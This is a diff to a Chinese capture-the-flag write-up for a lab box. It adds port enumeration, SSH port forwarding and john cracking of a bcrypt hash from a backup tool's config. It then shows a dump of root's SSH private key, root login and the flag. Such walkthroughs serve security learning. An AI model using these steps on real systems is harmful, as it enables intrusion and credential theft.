@@ -185,7 +185,26 @@ create_launchd_plist() {
 EOM
 }
 ```
-应该是存在内网服务，同时备份文件的位置在
+应该是存在不对外服务，查看端口
+```BASH
+$ ss -tuln
+Netid      State       Recv-Q      Send-Q           Local Address:Port           Peer Address:Port     Process      
+udp        UNCONN      0           0                127.0.0.53%lo:53                  0.0.0.0:*                     
+tcp        LISTEN      0           2048                 127.0.0.1:5000                0.0.0.0:*                     
+tcp        LISTEN      0           4096                 127.0.0.1:9898                0.0.0.0:*                     
+tcp        LISTEN      0           5                      0.0.0.0:9999                0.0.0.0:*                     
+tcp        LISTEN      0           511                    0.0.0.0:80                  0.0.0.0:*                     
+tcp        LISTEN      0           4096             127.0.0.53%lo:53                  0.0.0.0:*                     
+tcp        LISTEN      0           128                    0.0.0.0:22                  0.0.0.0:*                     
+tcp        LISTEN      0           5                      0.0.0.0:8000                0.0.0.0:*                     
+tcp        LISTEN      0           511                       [::]:80                     [::]:*                     
+tcp        LISTEN      0           128                       [::]:22                     [::]:*    
+```
+转发端口
+```shell
+ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
+```
+备份文件的位置在
 ```
 gael@artificial:/var/backups$ ll
 total 51972
@@ -203,6 +222,65 @@ drwxr-xr-x 13 root root       4096 Jun  2 07:38 ../
 -rw-r--r--  1 root root        268 Sep  5  2024 dpkg.diversions.0
 -rw-r--r--  1 root root        135 Sep 14  2024 dpkg.statoverride.0
 -rw-r--r--  1 root root     696841 Jun  9 10:48 dpkg.status.0
+```
+
+通过解压文件找到配置文件
+
+```JSON
+gael@artificial:~/1/backrest/.config/backrest$ cat config.json 
+{
+  "modno": 2,
+  "version": 4,
+  "instance": "Artificial",
+  "auth": {
+    "disabled": false,
+    "users": [
+      {
+        "name": "backrest_root",
+        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
+      }
+    ]
+  }
+}
+
+```
+
+john做bcrypt破解
+
+```BASH
+ohn --wordlist=/usr/share/wordlists/rockyou.txt ./bcrypt.txt --format=bcrypt                                 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+!@#$%^           (?)     
+1g 0:00:01:28 DONE (2025-09-11 11:12) 0.01135g/s 61.32p/s 61.32c/s 61.32C/s baby16..huevos
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+登陆仓库用密码
+![](attachments/Pasted%20image%2020250911232100.png)
+
+就可以按照先前的备份，创建仓库然后备份root文件夹
+
+![](attachments/Pasted%20image%2020250911232625.png)
+
+![](attachments/Pasted%20image%2020250911232809.png)
+
+导出root密钥
+```none
+dump 29c0b14d /root/.ssh/id_rsa
+```
+
+>SSH 协议要求私钥文件必须严格保护。如果权限过于宽松,会拒绝使用需要chmod
+
+```SHELL
+chmod 600 ./id_rsa
+ssh -i ./id_rsa root@10.10.11.74 
+root@artificial:~# cat root.txt 
+baa1eccf9cdc7b222433e13714404c42
 ```
 ## 参考文章
 https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model
